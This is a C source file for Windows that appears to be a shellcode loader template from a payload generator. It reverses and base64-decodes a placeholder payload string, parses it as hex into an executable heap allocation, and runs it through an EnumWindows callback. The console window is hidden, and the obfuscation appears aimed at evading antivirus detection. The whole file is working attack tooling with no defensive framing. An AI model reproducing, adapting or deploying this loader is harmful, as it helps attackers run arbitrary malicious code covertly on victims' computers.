#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

unsigned char b64_chr[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

unsigned int b64_int(unsigned int ch) {

	// ASCII to base64_int
	// 65-90  Upper Case  >>  0-25
	// 97-122 Lower Case  >>  26-51
	// 48-57  Numbers     >>  52-61
	// 43     Plus (+)    >>  62
	// 47     Slash (/)   >>  63
	// 61     Equal (=)   >>  64~
	if (ch == 43)
		return 62;
	if (ch == 47)
		return 63;
	if (ch == 61)
		return 64;
	if ((ch > 47) && (ch < 58))
		return ch + 4;
	if ((ch > 64) && (ch < 91))
		return ch - 'A';
	if ((ch > 96) && (ch < 123))
		return (ch - 'a') + 26;
	return 0;
}



unsigned int b64d_size(unsigned int in_size) {

	return ((3 * in_size) / 4);
}


unsigned int b64_decode( char* in, unsigned int in_len, char* out) {

	unsigned int i = 0, j = 0, k = 0, s[4];

	for (i = 0; i < in_len; i++) {
		s[j++] = b64_int(*(in + i));
		if (j == 4) {
			out[k + 0] = ((s[0] & 255) << 2) + ((s[1] & 0x30) >> 4);
			if (s[2] != 64) {
				out[k + 1] = ((s[1] & 0x0F) << 4) + ((s[2] & 0x3C) >> 2);
				if ((s[3] != 64)) {
					out[k + 2] = ((s[2] & 0x03) << 6) + (s[3]); k += 3;
				}
				else {
					k += 2;
				}
			}
			else {
				k += 1;
			}
			j = 0;
		}
	}

	return k;
}




void FormatCode(char* array, char* buf) {
	_strrev(array);
	while (*array) {
		if (' ' == *array) {
			array++;
			continue;
		}
		sscanf(array, "%02X", buf);
		array += 2;
		buf++;
	}
}

void hardCodeM() {


	char input[] = "{{SHELLCODE_STR}}";

	_strrev(input);

	int len_input = strlen(input);

	int out_size = b64d_size(len_input);

	char* array = (char *)malloc((sizeof(char) * out_size) + 1);

	b64_decode(input, len_input, array);

	_strrev(array);

	unsigned int memory_allocation = strlen(array) / 2;

	char* buf = (char*)malloc(memory_allocation);

	if (NULL == buf) {
		printf("malloc error");
		return;
	}

	memset(buf, 0, memory_allocation);

	FormatCode(array, buf);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, memory_allocation);

	RtlMoveMemory(ptr, buf, memory_allocation);

	//callback
	::EnumWindows((WNDENUMPROC)ptr, NULL);
}


//
// Main function
//
int main() {
	hardCodeM();
}